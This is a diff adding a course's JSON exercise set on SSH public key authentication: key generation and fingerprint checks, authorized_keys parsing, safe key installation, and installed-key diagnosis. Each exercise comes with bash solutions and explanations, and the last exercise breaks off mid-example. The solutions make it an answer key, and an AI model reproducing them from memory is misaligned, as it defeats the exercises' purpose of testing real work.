@@ -1,0 +1,661 @@
+{
+  "trackSlug": "ssh",
+  "moduleSlug": "public-key-authentication",
+  "exercises": [
+    {
+      "title": "Generate a Key Pair and Prove the Two Halves Belong Together",
+      "difficulty": "EASY",
+      "estimatedMinutes": 20,
+      "points": 10,
+      "concepts": [
+        "ssh-keygen",
+        "fingerprints",
+        "deriving the public key",
+        "key naming"
+      ],
+      "prerequisites": [
+        "running shell commands"
+      ],
+      "tags": [
+        "ssh",
+        "keys",
+        "bash",
+        "crypto"
+      ],
+      "problemHtml": "<p>A private key and a public key are not two independent files — the public half is contained in the private one, which is why <code>ssh-keygen -y</code> can rebuild a lost <code>.pub</code> and why both files report the same fingerprint. Turning that fact into a check you can run is the fastest way to answer &quot;are these two files actually a pair?&quot;, a question that comes up whenever keys have been copied between machines and renamed.</p><p>Write <code>make-key.sh NAME</code>:</p><ul><li>Generate an <strong>Ed25519</strong> key pair at <code>./NAME</code> and <code>./NAME.pub</code>, with no passphrase and the comment set to <code>NAME</code>.</li><li>Refuse to overwrite: if <code>./NAME</code> already exists, print <code>EXISTS ./NAME</code> and exit <code>1</code> without touching anything. Silently replacing a private key is how access is lost permanently.</li><li>Derive the public key from the private key with <code>ssh-keygen -y</code> and compare it against the generated <code>.pub</code>, ignoring the comment field (which <code>-y</code> does not emit).</li><li>Print the SHA256 fingerprint of each file and confirm they are equal.</li><li>On success print three lines: <code>fingerprint: &lt;fp&gt;</code>, <code>derived-matches-pub: yes</code>, <code>bytes: &lt;private&gt; private / &lt;public&gt; public</code>, then exit <code>0</code>.</li><li>If the derived key does not match, print <code>MISMATCH</code> and exit <code>2</code>.</li></ul><p>The byte counts are part of the output because seeing 399 against 95 makes the asymmetry concrete: the entire public half is 95 bytes you may publish, and the file that must never move is barely four times larger.</p>",
+      "inputSpec": "argv[1] is a base filename for the key pair. No stdin.",
+      "outputSpec": "Three lines on success ('fingerprint: SHA256:...', 'derived-matches-pub: yes', 'bytes: N private / M public') and exit 0; 'EXISTS ./NAME' and exit 1; or 'MISMATCH' and exit 2.",
+      "constraints": "Ed25519 only. No passphrase (-N ''). Never overwrite an existing private key. Compare only the type and base64 fields — ssh-keygen -y omits the comment, so a naive whole-line comparison always fails.",
+      "examplesJson": [
+        {
+          "input": "./make-key.sh id_backup",
+          "output": "fingerprint: SHA256:KzVxL+hH6wBL5CpzpKUgAM4s/3f82vOcbhnfqUuvTz8\nderived-matches-pub: yes\nbytes: 399 private / 91 public",
+          "explanation": "A fresh Ed25519 pair. 399 bytes is fixed for Ed25519; the public file is 91 bytes here because the comment id_backup is 9 characters — the same key commented cuong@macbook measures 95. Both figures were taken with wc -c on real generated keys."
+        },
+        {
+          "input": "./make-key.sh id_backup   # run a second time",
+          "output": "EXISTS ./id_backup",
+          "explanation": "Exit 1 and nothing is written. Had the script regenerated, every server carrying the old public key would have stopped accepting this machine, with no error to explain why."
+        },
+        {
+          "input": "./make-key.sh k   # after replacing k.pub with an unrelated key",
+          "output": "MISMATCH",
+          "explanation": "The .pub no longer corresponds to the private key. This is the state you get when keys are copied around and renamed, and it looks completely normal in a directory listing."
+        }
+      ],
+      "hintsJson": [
+        "`ssh-keygen -t ed25519 -C \"$NAME\" -f \"./$NAME\" -N ''` generates without prompting. The -N '' is what makes it non-interactive; without it the command blocks waiting for a passphrase.",
+        "`ssh-keygen -y -f ./NAME` prints the public key derived from the private key — but with only two fields, since it does not know the comment. Compare `cut -d' ' -f1,2` of each side.",
+        "`ssh-keygen -lf FILE` prints 'bits SHA256:fp comment (TYPE)'. Take field 2 with awk to get just the fingerprint.",
+        "Test the overwrite guard before anything else: `[ -e \"./$NAME\" ] && { echo \"EXISTS ./$NAME\"; exit 1; }`. Put it above the generate call, not after."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "make-key.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Tao mot cap khoa Ed25519 va CHUNG MINH hai nua thuoc ve nhau.\nset -uo pipefail\n\nNAME=${1:?usage: make-key.sh NAME}\n\n# TODO 1: neu ./$NAME da ton tai -> in \"EXISTS ./$NAME\", thoat 1.\n#         Dat CHOT NAY TRUOC khi sinh khoa. Ghi de mot khoa rieng la\n#         mat quyen truy cap vinh vien tren moi may dang giu khoa cu.\n\n# TODO 2: sinh cap khoa Ed25519, khong mat khau, chu thich la $NAME.\n\n# TODO 3: suy khoa cong khai TU khoa rieng bang `ssh-keygen -y`\n#         roi so voi file .pub. Chu y: -y KHONG in truong chu thich,\n#         nen chi so hai truong dau.\n\n# TODO 4: in dau van tay, ket qua so sanh, va so byte cua hai file.\n#         Khong khop -> in MISMATCH, thoat 2.\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "make-key.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Tao mot cap khoa Ed25519 va CHUNG MINH hai nua thuoc ve nhau.\nset -uo pipefail\n\nNAME=${1:?usage: make-key.sh NAME}\nPRIV=\"./$NAME\"\nPUB=\"./$NAME.pub\"\n\n# 1) Chot chong ghi de, dat TRUOC moi thu khac.\n#    ssh-keygen co hoi \"Overwrite?\" — nhung chi khi co terminal. Trong\n#    script thi khong co, va hanh vi khi do khong dang de cuoc.\nif [ -e \"$PRIV\" ]; then\n  echo \"EXISTS $PRIV\"\n  exit 1\nfi\n\n# 2) Sinh khoa. -N '' la thu lam cho lenh nay KHONG TUONG TAC;\n#    thieu no thi script treo cho ai do go mat khau.\nssh-keygen -t ed25519 -C \"$NAME\" -f \"$PRIV\" -N '' -q\n\n# 3) Suy khoa cong khai tu khoa rieng roi doi chieu.\n#    `ssh-keygen -y` chi in HAI truong (loai + base64) vi no khong biet\n#    chu thich. So ca dong se LUON khac nhau — cat lay 2 truong dau.\nderived=$(ssh-keygen -y -f \"$PRIV\" | cut -d' ' -f1,2)\nstored=$(cut -d' ' -f1,2 < \"$PUB\")\n\nif [ \"$derived\" != \"$stored\" ]; then\n  echo \"MISMATCH\"\n  exit 2\nfi\n\n# 4) Dau van tay: bang nhau du doc tu file nao, vi dau van tay la bam cua\n#    KHOA CONG KHAI, ma khoa cong khai thi nam san trong khoa rieng.\nfp_priv=$(ssh-keygen -lf \"$PRIV\" | awk '{print $2}')\nfp_pub=$(ssh-keygen -lf \"$PUB\"  | awk '{print $2}')\nif [ \"$fp_priv\" != \"$fp_pub\" ]; then\n  echo \"MISMATCH\"\n  exit 2\nfi\n\nbytes_priv=$(wc -c < \"$PRIV\" | tr -d ' ')\nbytes_pub=$(wc -c < \"$PUB\"  | tr -d ' ')\n\necho \"fingerprint: $fp_pub\"\necho \"derived-matches-pub: yes\"\necho \"bytes: $bytes_priv private / $bytes_pub public\"\nexit 0\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p>Two details decide whether this script works, and both come from knowing what the tools actually emit rather than what you expect them to.</p><p><strong><code>ssh-keygen -y</code> prints two fields, not three.</strong> The comment lives only in the <code>.pub</code> file; it is not part of the key and cannot be reconstructed from the private half. Comparing whole lines therefore reports MISMATCH for every correctly matched pair — a check that fails 100% of the time on healthy input, which is worse than no check, because you will eventually &quot;fix&quot; it by deleting a good key. <code>cut -d' ' -f1,2</code> on both sides compares exactly the part that is cryptographically meaningful.</p><p><strong>The overwrite guard has to come first.</strong> <code>ssh-keygen</code> asks for confirmation before overwriting — but only when it has a terminal to ask on. Inside a script, in CI, or over <code>ssh host 'cmd'</code> (Module 5), there is no terminal and you should not be relying on a prompt that may not appear. Testing <code>[ -e ]</code> before generating makes the behaviour the same everywhere. The consequence of getting this wrong is unusually harsh: a regenerated key silently invalidates every <code>authorized_keys</code> entry on every server that trusted the old one, and the resulting failure is the silent <code>Permission denied</code> that Module 3 exists to untangle.</p><p>The two fingerprint checks are deliberately redundant — deriving the key already proves the pair matches. The second comparison is there because <code>ssh-keygen -lf</code> on the private and public files is the check you will actually run by hand at a terminal, and seeing it produce identical output builds the habit of comparing fingerprints instead of squinting at base64.</p>",
+      "referenceUrl": "https://man.openbsd.org/ssh-keygen.1"
+    },
+    {
+      "title": "Read an authorized_keys File Like the Server Does",
+      "difficulty": "EASY",
+      "estimatedMinutes": 30,
+      "points": 10,
+      "concepts": [
+        "authorized_keys format",
+        "key options",
+        "fingerprinting a stored key",
+        "line-oriented parsing"
+      ],
+      "prerequisites": [
+        "public key file format",
+        "basic text processing"
+      ],
+      "tags": [
+        "ssh",
+        "keys",
+        "audit",
+        "bash"
+      ],
+      "problemHtml": "<p>An <code>authorized_keys</code> file that has been maintained for two years is a list of people who can log in as this user, written in a format nobody reads carefully. Some lines are bare keys. Some carry options like <code>restrict</code> or <code>command=\"…\"</code> that change what the key may do. Some belong to laptops that were replaced long ago.</p><p>Before you can decide anything about such a file, you need to see it the way sshd does. Write <code>read-keys.sh FILE</code> that prints one summary line per key.</p><ul><li>Skip blank lines and lines whose first non-space character is <code>#</code>.</li><li>For each remaining line print: <code>&lt;n&gt; &lt;type&gt; &lt;fingerprint&gt; &lt;comment&gt; [restricted|open]</code>, where <code>&lt;n&gt;</code> is the 1-based line number <strong>in the original file</strong> — that is the number sshd reports when a key matches, so it must count comments and blanks too.</li><li>A line is <code>restricted</code> if it begins with options rather than a key type; otherwise <code>open</code>. Key types always start with <code>ssh-</code>, <code>ecdsa-</code> or <code>sk-</code>.</li><li>The comment is whatever follows the base64 blob. If there is none, print <code>(no-comment)</code>.</li><li>Finish with <code>total: &lt;n&gt; keys, &lt;n&gt; restricted</code>.</li><li>If the file does not exist print <code>NO-FILE</code> and exit <code>1</code>.</li></ul><p>Getting the fingerprint of one line out of a multi-line file is the interesting part: <code>ssh-keygen -lf</code> works on a file, so a single line has to be handed to it somehow.</p>",
+      "inputSpec": "argv[1] is a path to an authorized_keys-format file. Lines may carry leading options, may be comments, and may be blank.",
+      "outputSpec": "One line per key: '<lineno> <type> SHA256:<fp> <comment> [restricted|open]', then 'total: N keys, M restricted'. 'NO-FILE' and exit 1 when the path does not exist.",
+      "constraints": "Line numbers must match the original file, including skipped lines. Do not assume the key is the first field — options may precede it. Do not use ssh-keygen -lf on the whole file, because it stops at the first unparseable line and you lose the per-line mapping.",
+      "examplesJson": [
+        {
+          "input": "# ops team\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGw2pKaViomw2P5pxizI9DoBKD7YTkI//q1xtri0SJCW cuong@macbook\n\nrestrict,command=\"/usr/local/bin/backup-only.sh\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+u9XMbezKRGiitbMkt5hWXGZHCIc6Wmu3NIJYkoWM+ backup-puller",
+          "output": "2 ED25519 SHA256:KzVxL+hH6wBL5CpzpKUgAM4s/3f82vOcbhnfqUuvTz8 cuong@macbook open\n4 ED25519 SHA256:sud5pPJCvtp/A+nmJYoK5Br9ENA6Jf5ontU4k/IN+s0 backup-puller restricted\ntotal: 2 keys, 1 restricted",
+          "explanation": "Both fingerprints are from real generated keys. Note the line numbers 2 and 4 — they count the comment and the blank line, exactly as sshd does when it reports 'authorized_keys:42'."
+        },
+        {
+          "input": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGw2pKaViomw2P5pxizI9DoBKD7YTkI//q1xtri0SJCW",
+          "output": "1 ED25519 SHA256:KzVxL+hH6wBL5CpzpKUgAM4s/3f82vOcbhnfqUuvTz8 (no-comment) open\ntotal: 1 keys, 0 restricted",
+          "explanation": "A key with no comment is legal and common when generated with -C ''. It is also the hardest kind to audit later, which is the point the output makes visible."
+        },
+        {
+          "input": "./read-keys.sh /root/.ssh/authorized_keys   # as a normal user",
+          "output": "NO-FILE",
+          "explanation": "Unreadable and non-existent are treated the same here: either way there is nothing to report. Exit 1."
+        }
+      ],
+      "hintsJson": [
+        "Use a counter you increment on every line read, including the ones you skip, so the reported number matches what sshd would print.",
+        "To find where the key starts, walk the whitespace-separated fields and take the first one matching `ssh-*`, `ecdsa-*` or `sk-*`. Anything before it is the options string, which means the line is restricted.",
+        "ssh-keygen -lf needs a file. Write the single key line to a temp file and fingerprint that: `printf '%s\\n' \"$keypart\" > \"$tmp\"; ssh-keygen -lf \"$tmp\"`. Remove the temp file in an EXIT trap.",
+        "Make the EXIT trap's last command unconditionally succeed (end it with `return 0`). Under set -e, a failing last command inside an EXIT trap replaces your real exit status."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "read-keys.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Doc mot file authorized_keys DUNG NHU sshd doc no.\nset -uo pipefail\n\nFILE=${1:?usage: read-keys.sh FILE}\n[ -r \"$FILE\" ] || { echo \"NO-FILE\"; exit 1; }\n\n# TODO 1: dem dong TU 1, dem CA dong trong va dong chu thich —\n#         vi do la con so sshd bao khi mot khoa khop.\n\n# TODO 2: voi moi dong that su co khoa, tim xem KHOA bat dau o truong nao.\n#         Truoc no la chuoi tuy chon -> dong do la \"restricted\".\n#         Loai khoa luon bat dau bang ssh- / ecdsa- / sk-\n\n# TODO 3: lay dau van tay cua RIENG dong do.\n#         ssh-keygen -lf can mot FILE, nen ghi ra file tam.\n\n# TODO 4: in dong tom tat, roi in tong ket.\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "read-keys.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Doc mot file authorized_keys DUNG NHU sshd doc no.\nset -uo pipefail\n\nFILE=${1:?usage: read-keys.sh FILE}\n[ -r \"$FILE\" ] || { echo \"NO-FILE\"; exit 1; }\n\ntmp=$(mktemp)\n# `return 0` o cuoi: voi set -e dang bat, mot lenh cuoi that bai trong bay\n# EXIT se ghi de ma thoat that cua script.\ncleanup() { rm -f \"$tmp\" 2>/dev/null; return 0; }\ntrap cleanup EXIT\n\nn=0; keys=0; restricted=0\n\nwhile IFS= read -r line || [ -n \"$line\" ]; do\n  n=$((n + 1))                       # dem MOI dong, ke ca dong bo qua\n\n  # Bo dong trong va dong chu thich — nhung VAN da tang bo dem o tren,\n  # vi so dong sshd bao la so dong trong FILE GOC.\n  case \"$line\" in\n    ''|\\#*|' '*\\#*) [ -z \"${line// /}\" ] && continue ;;\n  esac\n  [ -z \"${line// /}\" ] && continue\n  case \"${line#\"${line%%[! ]*}\"}\" in \\#*) continue ;; esac\n\n  # Tim truong dau tien la LOAI KHOA. Moi thu truoc no la tuy chon.\n  idx=0; keyidx=0\n  for field in $line; do\n    idx=$((idx + 1))\n    case \"$field\" in\n      ssh-*|ecdsa-*|sk-*) keyidx=$idx; break ;;\n    esac\n  done\n  [ \"$keyidx\" -eq 0 ] && continue    # khong phai dong khoa\n\n  if [ \"$keyidx\" -gt 1 ]; then\n    tag=restricted; restricted=$((restricted + 1))\n  else\n    tag=open\n  fi\n\n  # Cat bo phan tuy chon, giu lai tu loai khoa tro di.\n  keypart=$(printf '%s\\n' \"$line\" | cut -d' ' -f\"$keyidx\"-)\n  comment=$(printf '%s\\n' \"$keypart\" | cut -d' ' -f3-)\n  [ -z \"$comment\" ] && comment='(no-comment)'\n\n  # ssh-keygen -lf lam viec tren FILE. Dua RIENG dong nay cho no —\n  # chay tren ca file thi mot dong hong se lam mat anh xa theo dong.\n  printf '%s\\n' \"$keypart\" > \"$tmp\"\n  info=$(ssh-keygen -lf \"$tmp\" 2>/dev/null) || { echo \"$n ? (unparseable) $tag\"; continue; }\n  fp=$(printf '%s\\n' \"$info\" | awk '{print $2}')\n  type=$(printf '%s\\n' \"$info\" | awk '{print $NF}' | tr -d '()')\n\n  keys=$((keys + 1))\n  echo \"$n $type $fp $comment $tag\"\ndone < \"$FILE\"\n\necho \"total: $keys keys, $restricted restricted\"\nexit 0\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p>Three things in this script exist because of how the real format behaves rather than how it is usually described.</p><p><strong>The key is not always the first field.</strong> A line may open with <code>restrict,command=\"/usr/local/bin/backup-only.sh\"</code> before the key type. Any parser that assumes <code>$1</code> is the type silently misreads every restricted key — and restricted keys are precisely the ones an audit cares about. Scanning for the first field matching <code>ssh-*</code>, <code>ecdsa-*</code> or <code>sk-*</code> finds the boundary without needing to parse the options grammar, which is genuinely fiddly because option values may contain quoted spaces.</p><p><strong>Line numbers count everything.</strong> When sshd accepts a key it logs <code>Remote: /root/.ssh/authorized_keys:42</code>, and 42 is the line in the file on disk — comments and blanks included. A tool that numbers only the keys produces indexes that cannot be matched against that log line, defeating the main reason for having the numbers at all. Incrementing the counter before the skip tests keeps them aligned.</p><p><strong>Fingerprinting one line at a time.</strong> <code>ssh-keygen -lf</code> accepts a file, and running it over the whole <code>authorized_keys</code> is tempting. It stops at the first line it cannot parse, so one corrupted entry truncates the report — and it returns fingerprints with no indication of which line each came from. Writing each key to a temp file costs one write per key and keeps the mapping exact, including the ability to report an unparseable line in place rather than vanishing.</p><p>The <code>|| [ -n \"$line\" ]</code> on the <code>read</code> handles a final line with no trailing newline, which is common in files edited by scripts using <code>echo -n</code> or by <code>ssh-copy-id</code> on some systems. Without it the last key in such a file is silently dropped — the kind of bug that only shows up on the one server whose file was edited by hand.</p>",
+      "diagramMermaid": "flowchart TD\n  A[Doc mot dong] --> B[Tang bo dem dong]\n  B --> C{Dong trong hoac chu thich}\n  C -->|Dung| A\n  C -->|Khong| D[Tim truong dau tien la loai khoa]\n  D --> E{Truong do co phai truong 1 khong}\n  E -->|Phai| F[open]\n  E -->|Khong| G[restricted]\n  F --> H[Ghi rieng dong do ra file tam]\n  G --> H\n  H --> I[ssh-keygen -lf lay dau van tay]\n  I --> J[In dong tom tat]",
+      "referenceUrl": "https://man.openbsd.org/sshd.8#AUTHORIZED_KEYS_FILE_FORMAT"
+    },
+    {
+      "title": "Install a Key Without Deleting Everyone Else's",
+      "difficulty": "MEDIUM",
+      "estimatedMinutes": 40,
+      "points": 15,
+      "concepts": [
+        "append vs overwrite",
+        "idempotency",
+        "verify before disconnect",
+        "permissions on creation"
+      ],
+      "prerequisites": [
+        "authorized_keys format",
+        "running commands over ssh"
+      ],
+      "tags": [
+        "ssh",
+        "keys",
+        "provisioning",
+        "bash"
+      ],
+      "problemHtml": "<p>The one-liner everyone learns for installing a key is <code>cat key.pub | ssh host 'cat &gt; ~/.ssh/authorized_keys'</code>, and it contains a single-character bug that removes every other key on the account. The session you are using survives, so nothing appears wrong until a colleague or a CI job fails hours later.</p><p>Write <code>install-key.sh PUBKEY HOST</code> that does the job safely.</p><ul><li><strong>Append</strong>, never overwrite.</li><li>Be <strong>idempotent</strong>: running it twice must not add the key twice. Match on the base64 field, not the whole line, because the comment may differ between copies of the same key.</li><li>Create <code>~/.ssh</code> if missing with mode <code>700</code>, and ensure <code>authorized_keys</code> ends up mode <code>600</code>. A world-readable file is refused silently by sshd (Module 3).</li><li>After installing, <strong>verify from a fresh connection</strong> that key-only authentication now works, using <code>-o BatchMode=yes -o PreferredAuthentications=publickey</code>. Do not trust the write; prove it.</li><li>Print <code>ADDED &lt;fp&gt;</code>, or <code>ALREADY-PRESENT &lt;fp&gt;</code> if it was already there, then <code>VERIFIED</code> on a successful test login.</li><li>If the write succeeded but verification fails, print <code>WARN installed but login still fails — see Module 3</code> to stderr and exit <code>3</code>.</li></ul><p>The verification step is what makes this script worth writing. Every other failure mode in this track shares one symptom, and the moment to discover it is while you still have a working session open — not after you have closed it.</p>",
+      "inputSpec": "argv[1] is a path to a local .pub file. argv[2] is the SSH destination. The first connection may require a password, so BatchMode is not used for the install step.",
+      "outputSpec": "'ADDED SHA256:<fp>' or 'ALREADY-PRESENT SHA256:<fp>', followed by 'VERIFIED' on success (exit 0). On verification failure, a WARN line on stderr and exit 3.",
+      "constraints": "Use >> for the append. The duplicate check must compare the base64 field only. Never write authorized_keys with a mode looser than 600, and never create ~/.ssh looser than 700. The verification must open a new connection rather than reusing the install one.",
+      "examplesJson": [
+        {
+          "input": "./install-key.sh ~/.ssh/id_backup.pub cuong@may",
+          "output": "ADDED SHA256:sud5pPJCvtp/A+nmJYoK5Br9ENA6Jf5ontU4k/IN+s0\nVERIFIED",
+          "explanation": "First run: the key is appended, permissions are corrected, and a fresh key-only connection succeeds."
+        },
+        {
+          "input": "./install-key.sh ~/.ssh/id_backup.pub cuong@may   # second run",
+          "output": "ALREADY-PRESENT SHA256:sud5pPJCvtp/A+nmJYoK5Br9ENA6Jf5ontU4k/IN+s0\nVERIFIED",
+          "explanation": "Idempotent. Without the base64 comparison, a second run appends a duplicate line, which works but makes the file harder to audit and eventually pushes past MaxAuthTries."
+        },
+        {
+          "input": "./install-key.sh ~/.ssh/id_backup.pub cuong@may   # home dir is 0777",
+          "output": "ADDED SHA256:sud5pPJCvtp/A+nmJYoK5Br9ENA6Jf5ontU4k/IN+s0\nWARN installed but login still fails — see Module 3   (on stderr)\n$? = 3",
+          "explanation": "Reproduced with chmod 777 on the home directory. The key really is in the file and sshd refuses it anyway, logging 'Authentication refused: bad ownership or modes for directory /home/cuong'. Catching this while a session is still open is the whole point of verifying."
+        }
+      ],
+      "hintsJson": [
+        "Extract the base64 field locally with `awk '{print $2}' \"$PUBKEY\"`. That single field is what identifies the key; type and comment are not reliable for comparison.",
+        "Do the remote work with a quoted heredoc and `bash -s`, passing the key line and the base64 field as environment variables. It avoids a quoting war and keeps the remote logic readable.",
+        "Use `grep -qF -- \"$b64\"` on the remote side for the duplicate test. -F makes it a literal comparison so base64 characters like + and / are not treated as regex.",
+        "Verify with a second, separate ssh call using -o BatchMode=yes -o PreferredAuthentications=publickey -o IdentitiesOnly=yes -i <the private key>. BatchMode is essential: without it a failed key silently falls back to a password prompt and the test appears to pass."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "install-key.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Cai mot khoa cong khai len may xa MA KHONG xoa khoa cua nguoi khac.\nset -uo pipefail\n\nPUBKEY=${1:?usage: install-key.sh PUBKEY HOST}\nHOST=${2:?usage: install-key.sh PUBKEY HOST}\n[ -r \"$PUBKEY\" ] || { echo \"khong doc duoc $PUBKEY\" >&2; exit 1; }\n\n# TODO 1: lay dong khoa va RIENG truong base64 (truong 2) o may minh.\n#         Truong base64 la thu dinh danh cai khoa — chu thich thi khong.\n\n# TODO 2: chay phan viec o may xa qua heredoc CO NHAY + bash -s:\n#         - mkdir -p ~/.ssh, chmod 700\n#         - neu base64 DA co trong file -> khong them, bao ALREADY\n#         - nguoc lai NOI THEM bang >>  (mot dau > la xoa sach)\n#         - chmod 600 authorized_keys\n\n# TODO 3: KIEM CHUNG bang mot ket noi MOI, chi dung khoa:\n#         -o BatchMode=yes -o PreferredAuthentications=publickey\n#         Hong -> WARN ra stderr, thoat 3.\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "install-key.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Cai mot khoa cong khai len may xa MA KHONG xoa khoa cua nguoi khac.\nset -uo pipefail\n\nPUBKEY=${1:?usage: install-key.sh PUBKEY HOST}\nHOST=${2:?usage: install-key.sh PUBKEY HOST}\n[ -r \"$PUBKEY\" ] || { echo \"khong doc duoc $PUBKEY\" >&2; exit 1; }\n\nKEYLINE=$(head -1 \"$PUBKEY\")\nB64=$(awk '{print $2}' \"$PUBKEY\")           # truong dinh danh THAT SU\nFP=$(ssh-keygen -lf \"$PUBKEY\" | awk '{print $2}')\nPRIV=${PUBKEY%.pub}                          # khoa rieng de kiem chung\n\n# ── Cai dat ─────────────────────────────────────────────────────────\n# Heredoc CO NHAY: than script di nguyen ven, khong bi shell may nha gian.\n# KEYLINE va B64 di qua bien moi truong mot cach tuong minh.\nresult=$(ssh \"$HOST\" \"KEYLINE='$KEYLINE' B64='$B64' bash -s\" <<'REMOTE'\n  set -euo pipefail\n  mkdir -p ~/.ssh\n  chmod 700 ~/.ssh\n  touch ~/.ssh/authorized_keys\n\n  # -F: so sanh CHUOI THUAN. Base64 chua + va / — de nguyen cho regex\n  # doc thi ket qua se sai theo kieu rat kho thay.\n  if grep -qF -- \"$B64\" ~/.ssh/authorized_keys; then\n    echo \"ALREADY\"\n  else\n    # >> chu KHONG phai >. Mot dau > o day xoa sach khoa cua moi nguoi,\n    # va phien ban dang dung van song nen khong co gi bao cho ban biet.\n    printf '%s\\n' \"$KEYLINE\" >> ~/.ssh/authorized_keys\n    echo \"ADDED\"\n  fi\n  chmod 600 ~/.ssh/authorized_keys\nREMOTE\n) || { echo \"khong cai duoc khoa (ssh that bai)\" >&2; exit 1; }\n\ncase \"$result\" in\n  ALREADY) echo \"ALREADY-PRESENT $FP\" ;;\n  ADDED)   echo \"ADDED $FP\" ;;\n  *)       echo \"ket qua la khong ro: $result\" >&2; exit 1 ;;\nesac\n\n# ── Kiem chung ──────────────────────────────────────────────────────\n# Ket noi MOI, CHI cho phep khoa. BatchMode=yes la bat buoc: thieu no,\n# mot cai khoa bi tu choi se lang le quay ve hoi mat khau, ban go vao,\n# va phep kiem bao \"thanh cong\" cho mot cau hinh van dang hong.\nif ssh -o BatchMode=yes \\\n       -o PreferredAuthentications=publickey \\\n       -o IdentitiesOnly=yes \\\n       -o ConnectTimeout=10 \\\n       -i \"$PRIV\" \"$HOST\" true 2>/dev/null; then\n  echo \"VERIFIED\"\n  exit 0\nfi\n\necho \"WARN installed but login still fails — see Module 3\" >&2\nexit 3\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p><strong>The one-character bug.</strong> <code>&gt;</code> truncates; <code>&gt;&gt;</code> appends. With <code>&gt;</code>, every other key on that account is gone the instant the command runs — a colleague's laptop, the CI deploy key, the backup key from Module 2's worked example. The connection you are sitting in stays alive because authentication already happened, so there is no feedback at all. The damage surfaces the next time someone else connects, by which point the cause is hours behind you.</p><p><strong>Why the duplicate check compares base64 only.</strong> The same key installed from two machines can carry different comments (<code>cuong@macbook</code> versus <code>cuong@macbook.local</code>), and options may be prepended on one copy. Comparing whole lines therefore reports &quot;not present&quot; for a key that is present, and appends a second copy. Beyond untidiness that has a real cost: each stored key the client offers counts against <code>MaxAuthTries</code>, which is <strong>6</strong> on the production VPS, so accumulating duplicates eventually disconnects clients before their working key is reached. <code>grep -F</code> matters too — base64 contains <code>+</code> and <code>/</code>, which a regex would interpret.</p><p><strong>Verification is the part that earns its keep.</strong> Writing the file proves nothing, because sshd may still refuse the key for reasons the write cannot detect: a group-writable home directory, an SELinux label, <code>PubkeyAuthentication no</code>, or an <code>AllowUsers</code> line that excludes this account. All four produce the identical <code>Permission denied (publickey,password)</code>. Testing on a <em>separate</em> connection while the original session is still open means you find out at the only moment when fixing it is easy.</p><p><code>BatchMode=yes</code> is not optional in that test. Without it, a rejected key falls back to a password prompt; you type the password out of habit, the connection succeeds, and the script reports VERIFIED for a key that does not work. The test would confirm exactly the wrong thing.</p>",
+      "diagramMermaid": "flowchart TD\n  A[Doc file pub o may minh] --> B[Tach truong base64 va dau van tay]\n  B --> C[Chay bash -s tren may xa]\n  C --> D{base64 da co trong file chua}\n  D -->|Roi| E[ALREADY khong ghi gi]\n  D -->|Chua| F[Noi them bang hai dau lon hon]\n  E --> G[chmod 700 thu muc va 600 file]\n  F --> G\n  G --> H[Mo KET NOI MOI chi dung khoa]\n  H --> I{Vao duoc khong}\n  I -->|Duoc| J[VERIFIED thoat 0]\n  I -->|Khong| K[WARN thoat 3 xem Module 3]",
+      "referenceUrl": "https://man.openbsd.org/ssh-copy-id.1"
+    },
+    {
+      "title": "Is the Right Key Even Installed?",
+      "difficulty": "MEDIUM",
+      "estimatedMinutes": 35,
+      "points": 15,
+      "concepts": [
+        "fingerprint comparison",
+        "client offering vs server contents",
+        "diagnosis by elimination"
+      ],
+      "prerequisites": [
+        "fingerprints",
+        "reading ssh -v output"
+      ],
+      "tags": [
+        "ssh",
+        "keys",
+        "diagnostics",
+        "bash"
+      ],
+      "problemHtml": "<p>When a key is refused there are four possible causes, and they all print the same message. Before investigating permissions, SELinux or server config, it is worth eliminating the cheapest possibility first: <strong>the key you are offering is simply not in the file</strong>.</p><p>Answering that turns out to be a string comparison, because a fingerprint can be computed from a private key, from a public key, and from a line in <code>authorized_keys</code> — and all three agree when they describe the same key.</p><p>Write <code>key-installed.sh KEYFILE HOST</code>:</p><ul><li>Compute the fingerprint of <code>KEYFILE</code> locally. It must work whether the caller passes the private key or the <code>.pub</code>.</li><li>Fetch the remote <code>~/.ssh/authorized_keys</code> and compute the fingerprint of every line in it.</li><li>If the local fingerprint appears, print <code>INSTALLED &lt;fp&gt; at line &lt;n&gt;</code> and exit <code>0</code>.</li><li>If it does not, print <code>NOT-INSTALLED &lt;fp&gt;</code>, then list the fingerprints that <em>are</em> present as <code>present: &lt;fp&gt; &lt;comment&gt;</code> lines, and exit <code>4</code>. Showing what is there turns a dead end into a lead — often the answer is that your key is installed for a different user.</li><li>If the remote file is missing or unreadable, print <code>NO-REMOTE-FILE</code> and exit <code>5</code>.</li><li>Do not use the key being tested to connect. Diagnosing a broken key by requiring it to work is circular; the connection may use a password or another key.</li></ul><p>The line number is worth reporting because sshd names it in its logs, which lets you match this output against the server's own record of which key opened the door.</p>",
+      "inputSpec": "argv[1] is a path to a private or public key file. argv[2] is the SSH destination used to read the remote file.",
+      "outputSpec": "'INSTALLED SHA256:<fp> at line <n>' (exit 0); 'NOT-INSTALLED SHA256:<fp>' followed by 'present: <fp> <comment>' lines (exit 4); or 'NO-REMOTE-FILE' (exit 5).",
+      "constraints": "The connection must not depend on the key being tested — do not pass it with -i. Handle both key file kinds without asking the caller which one it is. Ignore blank and comment lines in the remote file. Options preceding a key must not break the fingerprinting.",
+      "examplesJson": [
+        {
+          "input": "./key-installed.sh ~/.ssh/id_backup cuong@may",
+          "output": "INSTALLED SHA256:sud5pPJCvtp/A+nmJYoK5Br9ENA6Jf5ontU4k/IN+s0 at line 4",
